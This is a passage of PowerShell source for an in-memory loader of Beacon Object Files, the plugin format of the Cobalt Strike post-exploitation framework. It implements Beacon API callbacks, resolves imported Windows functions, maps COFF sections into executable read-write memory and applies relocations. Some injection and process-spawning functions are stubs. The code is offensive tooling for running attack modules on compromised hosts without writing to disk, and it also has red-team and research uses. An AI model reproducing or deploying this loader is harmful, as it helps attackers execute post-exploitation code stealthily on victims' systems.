                [System.Runtime.InteropServices.Marshal]::Copy($ManagedTemp, 0, $BufferOffset, $Value.Length)

                $FormatObject.length += $Value.Length

                # Back to format
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($FormatObject, $Format, $false)

            }

            ############################
            #        Output API        #
            ############################

            # internal Printf function
            # CLR has limitatioin concerning varargs
            # Only register params can be used
            # At the end we only have 2 varargs parameters
            static [string] Printf([string] $Fmt, [IntPtr]$a1, [IntPtr]$a2)
            {
                $Args = @($a1, $a2)
                $ArgNumber = 0

                $Result = ""

                for($i=0; $i -lt $Fmt.Length; $i++)
                {
                    if($Fmt[$i] -eq "%")
                    {
                        # Ascii string formating
                        if(($Fmt[$i + 1] -eq "s" -or $Fmt[$i + 1] -eq "S") -and $ArgNumber -lt $Args.Length)
                        {
                            $Result += [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Args[$ArgNumber])
                            $i += 1
                            $ArgNumber += 1
                        }
                        # Integer
                        elseif(($Fmt[$i + 1] -eq "d") -and $ArgNumber -lt $Args.Length)
                        {
                            $Result += [int]$Args[$ArgNumber]
                            $i += 1
                            $ArgNumber += 1
                        }
                        # Unicode string formating
                        elseif(($Fmt[$i + 1] -eq "l" -and $Fmt[$i + 2] -eq "s") -and $ArgNumber -lt $Args.Length)
                        {
                            $Result += [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Args[$ArgNumber])
                            $i += 2
                            $ArgNumber += 1
                        }
                    }
                    else
                    {
                        $Result += $Fmt[$i]
                    }
                }
                return $Result
            }


            # Print into powershell console
            static [void] BeaconPrintf([int] $Type, [string] $Fmt, [IntPtr]$a1, [IntPtr]$a2)
            {
                [BeaconAPI]::Printf($Fmt, $a1, $a2) | Write-Host
            }

            # Dump hex data in console to audit format buffer for example
            static [void] BeaconOutput([int] $Type, [IntPtr] $Data, [int] $Len)
            {
                # Copy from unmanaged to managed world
                $ManagedTemp = New-Object Byte[] $Len
                [System.Runtime.InteropServices.Marshal]::Copy($Data, $ManagedTemp, 0, $Len)

                Write-Host "=============================== Beacon Output =============================="
                $ManagedTemp | Format-Hex | Write-Host
                Write-Host "============================================================================"
            }

            ############################
            #       Internal APIs      #
            ############################

            # Api use by beacon to check current process privilege
            static [bool] BeaconIsAdmin()
            {
                return Test-IsAdmin
            }

            # NOT IMPLEMENTED
            static [bool] BeaconUseToken([IntPtr] $Token)
            {
                return $script:Win32Functions.SetThreadToken([IntPtr]::Zero, $Token)
            }

            # NOT IMPLEMENTED
            static [bool] BeaconRevertToken()
            {
                return $false
            }

            # NOT IMPLEMENTED
            static [void] BeaconGetSpawnTo([bool] $X86, [IntPtr] $Buffer, [int] $Length)
            {
            }

            # NOT IMPLEMENTED
            static [bool] BeaconSpawnTemporaryProcess([bool] $X86, [bool] $IgnoreToken, [IntPtr] $SInfo, [IntPtr] $PInfo)
            {
                return $false
            }

            # NOT IMPLEMENTED
            static [void] BeaconInjectProcess([IntPtr] $HProc, [int] $Pid, [IntPtr] $Payload, [int] $PayloadLen, [int] $PayloadOffset, [IntPtr] $Arg, [int] $ArgLen)
            {
                
            }

            # NOT IMPLEMENTED
            static [void] BeaconInjectTemporaryProcess([IntPtr] $PInfo, [IntPtr] $Payload, [int] $PayloadLen, [int] $PayloadOffset, [IntPtr] $Arg, [int] $ArgLen)
            {
            }

            # NOT IMPLEMENTED
            static [void] BeaconCleanupProcess([IntPtr] $PInfo)
            {
            }

            # Convert an ascii string into a wide char (unicode) string
            static [bool] toWideChar([IntPtr] $Src, [IntPtr] $Dst, [int] $Max)
            {
                try
                {
                    $AsciiString = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Src)
                    $BytesArray = [System.Text.Encoding]::Unicode.GetBytes($AsciiString)
                    $BytesArray += [Byte]0
                    $BytesArray += [Byte]0
                    [System.Runtime.InteropServices.Marshal]::Copy($BytesArray, 0, $Dst, ($BytesArray.Length,$Max | Measure -Min).Minimum)
                } 
                catch
                {
                    return $false
                }
                
                return $true
            }
        }

        $BeaconAPI = New-Object System.Object

        $BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataParse -Value ($BeaconDataParseDelegate)

        $BeaconDataExtractDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])), [BeaconAPI].GetMethod("BeaconDataExtract"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataExtract -Value ($BeaconDataExtractDelegate)

        $BeaconDataIntDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([int])), [BeaconAPI].GetMethod("BeaconDataInt"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataInt -Value ($BeaconDataIntDelegate)

        $BeaconDataShortDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([int16])), [BeaconAPI].GetMethod("BeaconDataShort"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataShort -Value ($BeaconDataShortDelegate)

        $BeaconDataLengthDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([int])), [BeaconAPI].GetMethod("BeaconDataLength"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconDataLength -Value ($BeaconDataLengthDelegate)

        $BeaconIsAdminDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @() ([bool])), [BeaconAPI].GetMethod("BeaconIsAdmin"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconIsAdmin -Value ($BeaconIsAdminDelegate)

        $BeaconFormatAllocDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconFormatAlloc"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconFormatAlloc -Value ($BeaconFormatAllocDelegate)

        $BeaconFormatFreeDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([void])), [BeaconAPI].GetMethod("BeaconFormatFree"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconFormatFree -Value ($BeaconFormatFreeDelegate)

        $BeaconFormatResetDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([void])), [BeaconAPI].GetMethod("BeaconFormatReset"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconFormatReset -Value ($BeaconFormatResetDelegate)

        $BeaconFormatAppendDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconFormatAppend"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconFormatAppend -Value ($BeaconFormatAppendDelegate)

        $BeaconFormatToStringDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])), [BeaconAPI].GetMethod("BeaconFormatToString"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconFormatToString -Value ($BeaconFormatToStringDelegate)

        $BeaconFormatIntDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconFormatInt"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconFormatInt -Value ($BeaconFormatIntDelegate)

        $BeaconFormatPrintfDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [string], [IntPtr], [IntPtr]) ([void])), [BeaconAPI].GetMethod("BeaconFormatPrintf"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconFormatPrintf -Value ($BeaconFormatPrintfDelegate)

        $BeaconPrintfDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([int], [string], [IntPtr], [IntPtr]) ([void])), [BeaconAPI].GetMethod("BeaconPrintf"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconPrintf -Value ($BeaconPrintfDelegate)

        $BeaconOutputDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([int], [IntPtr], [int])), [BeaconAPI].GetMethod("BeaconOutput"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconOutput -Value ($BeaconOutputDelegate)

        $BeaconUseTokenDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([bool])), [BeaconAPI].GetMethod("BeaconUseToken"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconUseToken -Value ($BeaconUseTokenDelegate)

        $BeaconRevertTokenDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @() ([bool])), [BeaconAPI].GetMethod("BeaconRevertToken"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconRevertToken -Value ($BeaconRevertTokenDelegate)

        $BeaconGetSpawnToDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([bool], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconGetSpawnTo"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconGetSpawnTo -Value ($BeaconGetSpawnToDelegate)

        $BeaconSpawnTemporaryProcessDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([bool], [bool], [IntPtr], [IntPtr]) ([bool])), [BeaconAPI].GetMethod("BeaconSpawnTemporaryProcess"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconSpawnTemporaryProcess -Value ($BeaconSpawnTemporaryProcessDelegate)

        $BeaconInjectProcessDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [int], [IntPtr], [int], [int], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconInjectProcess"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconInjectProcess -Value ($BeaconInjectProcessDelegate)

        $BeaconInjectTemporaryProcessDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int], [int], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconInjectTemporaryProcess"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconInjectTemporaryProcess -Value ($BeaconInjectTemporaryProcessDelegate)

        $BeaconCleanupProcessDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([void])), [BeaconAPI].GetMethod("BeaconCleanupProcess"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconCleanupProcess -Value ($BeaconCleanupProcessDelegate)

        $toWideCharDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([bool])), [BeaconAPI].GetMethod("toWideChar"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name toWideChar -Value ($toWideCharDelegate)

        return $BeaconAPI
    }

    # Function that will resolve extern function
    # 2 Kinds of extern are handled
    # - Module api name __imp_MODULE_NAME$EXPORT_NAME will be handled by LoadLibrary, GetProcAddress
    # - Function start with __imp_Beacon are resolved internally rusing BeaconAPI
    Function Resolve-Extern
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [String[]]
        $Name,
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $BeaconAPI
        )

        if ($Symbol -eq "__imp_BeaconDataParse")
        {
            Write-Debug "[+] Resolving BeaconDataParse"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconDataParse)
        }
        elseif($Symbol -eq "__imp_BeaconDataExtract")
        {
            Write-Debug "[+] Resolving BeaconDataExtract"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconDataExtract)
        }
        elseif($Symbol -eq "__imp_BeaconPrintf")
        {
            Write-Debug "[+] Resolving BeaconPrintf"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconPrintf)
        }
        elseif($Symbol -eq "__imp_BeaconDataInt")
        {
            Write-Debug "[+] Resolving BeaconDataInt"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconDataInt)
        }
        elseif($Symbol -eq "__imp_BeaconDataShort")
        {
            Write-Debug "[+] Resolving BeaconDataShort"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconDataShort)
        }
        elseif($Symbol -eq "__imp_BeaconDataLength")
        {
            Write-Debug "[+] Resolving BeaconDataLength"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconDataLength)
        }
        elseif($Symbol -eq "__imp_BeaconIsAdmin")
        {
            Write-Debug "[+] Resolving BeaconIsAdmin"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconIsAdmin)
        }
        elseif($Symbol -eq "__imp_BeaconFormatAlloc")
        {
            Write-Debug "[+] Resolving BeaconFormatAlloc"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconFormatAlloc)
        }
        elseif($Symbol -eq "__imp_BeaconFormatFree")
        {
            Write-Debug "[+] Resolving BeaconFormatFree"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconFormatFree)
        }
        elseif($Symbol -eq "__imp_BeaconFormatReset")
        {
            Write-Debug "[+] Resolving BeaconFormatReset"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconFormatReset)
        }
        elseif($Symbol -eq "__imp_BeaconFormatAppend")
        {
            Write-Debug "[+] Resolving BeaconFormatReset"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconFormatAppend)
        }
        elseif($Symbol -eq "__imp_BeaconFormatToString")
        {
            Write-Debug "[+] Resolving BeaconFormatToString"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconFormatToString)
        }
        elseif($Symbol -eq "__imp_BeaconFormatInt")
        {
            Write-Debug "[+] Resolving BeaconFormatInt"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconFormatInt)
        }
        elseif($Symbol -eq "__imp_BeaconFormatPrintf")
        {
            Write-Debug "[+] Resolving BeaconFormatPrintf"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconFormatPrintf)
        }
        elseif($Symbol -eq "__imp_BeaconOutput")
        {
            Write-Debug "[+] Resolving BeaconOutput"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconOutput)
        }
        elseif($Symbol -eq "__imp_BeaconUseToken")
        {
            Write-Debug "[+] Resolving BeaconUseToken"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconUseToken)
        }
        elseif($Symbol -eq "__imp_BeaconRevertToken")
        {
            Write-Debug "[+] Resolving BeaconRevertToken"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconRevertToken)
        }
        elseif($Symbol -eq "__imp_BeaconGetSpawnTo")
        {
            Write-Debug "[+] Resolving BeaconGetSpawnTo"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconGetSpawnTo)
        }
        elseif($Symbol -eq "__imp_BeaconSpawnTemporaryProcess")
        {
            Write-Debug "[+] Resolving BeaconSpawnTemporaryProcess"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconSpawnTemporaryProcess)
        }
        elseif($Symbol -eq "__imp_BeaconInjectProcess")
        {
            Write-Debug "[+] Resolving BeaconSpawnTemporaryProcess"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconInjectProcess)
        }
        elseif($Symbol -eq "__imp_BeaconInjectTemporaryProcess")
        {
            Write-Debug "[+] Resolving BeaconSpawnTemporaryProcess"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconInjectTemporaryProcess)
        }
        elseif($Symbol -eq "__imp_BeaconCleanupProcess")
        {
            Write-Debug "[+] Resolving BeaconSpawnTemporaryProcess"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconCleanupProcess)
        }
        elseif($Symbol -eq "__imp_toWideChar")
        {
            Write-Debug "[+] Resolving BeaconSpawnTemporaryProcess"
            return [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.toWideChar)
        }

        # If it's not part of the beacon API
        # we will try to resolve it
        $ResolvedAPI = $Name.Split("$")

        if ($ResolvedAPI.Length -ne 2)
        {
            Write-Host "[!] Unable to parse API name : " $Name " /!\ continue without resolving /!\"

            return [IntPtr]::Zero
        }

        $ModuleName = $ResolvedAPI[0].Substring("__imp_".Length, $ResolvedAPI[0].Length - "__imp_".Length)
        $FunctionName = $ResolvedAPI[1]

        $ModuleHandle = $Win32Functions.LoadLibrary.Invoke(($ModuleName+".dll"))

        if ($ModuleHandle -eq [IntPtr]::Zero)
        {
            throw ("Unable to find Module : " + $ModuleName)
        }

        $Function = $Win32Functions.GetProcAddress.Invoke($ModuleHandle, $FunctionName)

        if($Function -eq [IntPtr]::Zero)
        {
            throw ("Unable to resolve API : " + $FunctionName)
        }

        Write-Debug ("[+] Resolving " + $ModuleName + " " + $FunctionName + " at " + ("0x{0:x4}" -f [Int64]$Function))
        return $Function
    }

    Function Apply-Relocation
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [UInt32]
        $VirtualAddress,

        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $SourceAddress,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $DestAddress,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Type,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

         # Compute start and end offset
        [IntPtr]$OffsetPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SourceAddress) ($VirtualAddress))
        [IntPtr]$EndOffsetPtr = [Int64]$OffsetPtr+4                   

        # compute the relative address
        if($Type -eq $Win32Constants.IMAGE_REL_AMD64_REL32)
        {
            # retrieve actual value of the offset
            $OffsetValue = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OffsetPtr, [Type][Int32])  
            $OffsetValue += [Int64](Sub-SignedIntAsUnsigned ([Int64]$DestAddress) ($EndOffsetPtr))
            $OffsetValueArray = @($OffsetValue)
            [System.Runtime.InteropServices.Marshal]::Copy([Int32[]]$OffsetValueArray, 0, $OffsetPtr, 1) | Out-Null
        }
        elseif($Type -eq $Win32Constants.IMAGE_REL_AMD64_ADDR32NB)
        {
            # retrieve actual value of the offset
            $OffsetValue = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OffsetPtr, [Type][Int32])  
            $OffsetValue = [Int64](Sub-SignedIntAsUnsigned ([Int64]$DestAddress) ($EndOffsetPtr))
            $OffsetValueArray = @($OffsetValue)
            [System.Runtime.InteropServices.Marshal]::Copy([Int32[]]$OffsetValueArray, 0, $OffsetPtr, 1) | Out-Null
        }
        elseif($Type -eq $Win32Constants.IMAGE_REL_AMD64_ADDR64)
        {
            # retrieve actual value of the offset
            $OffsetValue = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OffsetPtr, [Type][Int64])  
            $OffsetValue = [Int64](Sub-SignedIntAsUnsigned ([Int64]$DestAddress) ($EndOffsetPtr))
            $OffsetValueArray = @($OffsetValue)
            [System.Runtime.InteropServices.Marshal]::Copy([Int64[]]$OffsetValueArray, 0, $OffsetPtr, 1) | Out-Null
        }
        else
        {
            Write-Error ("Unknown Relocation : " + $Relocation.Type)
        }

        Write-Debug ("[+] Apply relocation at " + ("0x{0:x4}" -f [Int64]$OffsetPtr) + " " +("0x{0:x4}" -f [Int32]$OffsetValue))         
    }

    
    # Function use to marshal beacon argument
    # Beacon arguement are Length Value buffer
    Function Load-BeaconParameters
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object[]]
        $ArgumentList,

        [Parameter(Position = 1, Mandatory = $true)]
        [bool]
        $UnicodeStringParameter
        )

        $ArgumentBytes = @()
        $Size = 0
        foreach($Arg in $ArgumentList)
        {
            if($Arg.GetType() -eq [System.String])
            {
                if ($UnicodeStringParameter)
                {
                    $ArgBytes = [System.Text.Encoding]::Unicode.GetBytes($Arg)
                    # We always add unicode null terminated byte
                    $ArgBytes += [Byte]0
                    $ArgBytes += [Byte]0
                }
                else
                {
                    $ArgBytes = [System.Text.Encoding]::ASCII.GetBytes($Arg)
                    # We always add null terminated byte
                    $ArgBytes += [Byte]0
                } 
            }
            elseif($Arg.GetType() -eq [int])
            {
                $ArgBytes = [System.BitConverter]::GetBytes([UInt32]$Arg)
            }
            else
            {
                throw ("Invalid Beacon parameter type "+$Arg.GetType())
            }

            $Size += $ArgBytes.Length
            $ArgumentBytes += ,$ArgBytes
        }

        # Header size using 4 bytes to encode size
        [IntPtr]$UnmanagedArgBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size + 4 * $ArgumentBytes.Length)

        $Offset = 0
        foreach($ArgBytes in $ArgumentBytes)
        {
            
            [IntPtr]$OffsetPtrHeader = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$UnmanagedArgBytes) ($Offset))
            [IntPtr]$OffsetPtrBody = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$UnmanagedArgBytes) ($Offset + 4))

            $EncodingLength = [System.BitConverter]::GetBytes([UInt32]$ArgBytes.Length)
            
            [System.Runtime.InteropServices.Marshal]::Copy($EncodingLength, 0, $OffsetPtrHeader, $EncodingLength.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($ArgBytes, 0, $OffsetPtrBody, $ArgBytes.Length)
            $Offset += 4 + $ArgBytes.Length
        }

        return $UnmanagedArgBytes, $Offset
    }

    Function Unload-BeaconParameters
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $ArgumentBytes
        )

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ArgumentBytes)
    }

    Function Load-Bof
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $CoffBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $BeaconAPI
        )

        $CoffInfo = New-Object System.Object

        [IntPtr]$UnmanagedCoffBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CoffBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($CoffBytes, 0, $UnmanagedCoffBytes, $CoffBytes.Length) | Out-Null

        $CoffHeadersInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($UnmanagedCoffBytes, [Type]$Win32Types.IMAGE_FILE_HEADER)
        
        $CoffInfo | Add-Member -MemberType NoteProperty -Name 'IMAGE_FILE_HEADER' -Value ($CoffHeadersInfo)
       
        [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$UnmanagedCoffBytes) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_FILE_HEADER)))
        [IntPtr]$SymbolTablePtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$UnmanagedCoffBytes) ($CoffInfo.IMAGE_FILE_HEADER.PointerToSymbolTable))
        [IntPtr]$SymbolValuePtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SymbolTablePtr) ($CoffInfo.IMAGE_FILE_HEADER.NumberOfSymbols * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.COFF_SYMBOL)))
        
        $Sections = @()
        # Loading all sections
        for( $i = 0; $i -lt $CoffInfo.IMAGE_FILE_HEADER.NumberOfSections; $i++)
        {
            $CurrentSection = New-Object System.Object
            [IntPtr]$CurrentSectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CurrentSectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            
            $CurrentSection | Add-Member -MemberType NoteProperty -Name 'IMAGE_SECTION_HEADER' -Value ($SectionHeader)

            $CurrentSectionName = [System.Text.Encoding]::Default.GetString($CurrentSection.IMAGE_SECTION_HEADER.Name)

            if ($CurrentSection.IMAGE_SECTION_HEADER.SizeOfRawData -ne 0)
            {
               $Handle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$CurrentSection.IMAGE_SECTION_HEADER.SizeOfRawData, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
               $CurrentSection | Add-Member -MemberType NoteProperty -Name 'Handle' -Value ($Handle)

               # Ignore .bss section because already initialized with zeros
               if ($CurrentSectionName -ne ".bss")
               {
                    [System.Runtime.InteropServices.Marshal]::Copy($CoffBytes, [Int32]$CurrentSection.IMAGE_SECTION_HEADER.PointerToRawData, $Handle, $CurrentSection.IMAGE_SECTION_HEADER.SizeOfRawData) | Out-Null         
               }
               Write-Host "[+] Mapping of" $CurrentSectionName "at " ("0x{0:x4}" -f [Int64]$CurrentSection.Handle)
            }

            $Sections += ,$CurrentSection
            
        }

        $Size = New-Object UIntPtr 2048
        $GotHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$Size, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        
        $GotTable = @()

        # Apply Relocation for all sections
        foreach($CurrentSection in $Sections)
        {
            for ($r = 0; $r -lt $CurrentSection.IMAGE_SECTION_HEADER.NumberOfRelocations; $r++)
            {
                [IntPtr]$RelocationPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$UnmanagedCoffBytes) ($CurrentSection.IMAGE_SECTION_HEADER.PointerToRelocations + $r * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.COFF_RELOCATION)))
                $Relocation = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationPtr, [Type]$Win32Types.COFF_RELOCATION)

                [IntPtr]$SymbolEntryPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SymbolTablePtr) ($Relocation.SymbolTableIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.COFF_SYMBOL)))
                $SymbolEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SymbolEntryPtr, [Type]$Win32Types.COFF_SYMBOL)

                # External symbol (imported function)
                if ($SymbolEntry.StorageClass -eq $Win32Constants.IMAGE_SYM_CLASS_EXTERNAL -and $SymbolEntry.Value1 -eq 0)
                {

                    # Compute symbol offset
                    [IntPtr]$SymbolPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SymbolValuePtr) ($SymbolEntry.Value2))
                    $Symbol = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($SymbolPtr)
       
                    $Function = Resolve-Extern $Symbol $Win32Functions $BeaconAPI
                    
                    $GotTable += ,$Function
                    
                    [IntPtr]$GotOffset = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$GotHandle) (8 * ($GotTable.Length - 1)))

                    Apply-Relocation -VirtualAddress $Relocation.VirtualAddress -SourceAddress $CurrentSection.Handle -DestAddress $GotOffset -Type $Relocation.Type -Win32Constants $Win32Constants
                    
                }
                # Direct relocation
                elseif (($SymbolEntry.StorageClass -eq $Win32Constants.IMAGE_SYM_CLASS_STATIC) -or ($SymbolEntry.StorageClass -eq $Win32Constants.IMAGE_SYM_CLASS_LABEL))
                {
                    Apply-Relocation -VirtualAddress $Relocation.VirtualAddress -SourceAddress $CurrentSection.Handle -DestAddress $Sections[$SymbolEntry.SectionNumber - 1].Handle -Type $Relocation.Type -Win32Constants $Win32Constants  
                }
            }
        }

        [System.Runtime.InteropServices.Marshal]::Copy([Int64[]]$GotTable, 0, $GotHandle, $GotTable.Length) | Out-Null

        $CoffInfo | Add-Member -MemberType NoteProperty -Name 'Sections' -Value ($Sections)

        # Provisioning symbols
        $SymbolEntryTable = @()

        for($i = 0; $i -lt $CoffInfo.IMAGE_FILE_HEADER.NumberOfSymbols; $i++)
        {
            [IntPtr]$SymbolEntryPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SymbolTablePtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.COFF_SYMBOL_NAMED)))
            $SymbolEntryNamed = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SymbolEntryPtr, [Type]$Win32Types.COFF_SYMBOL_NAMED)
            $SymbolEntry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SymbolEntryPtr, [Type]$Win32Types.COFF_SYMBOL)
           
            # Ignoring unamed symbol
            # These list is used to compute entry point
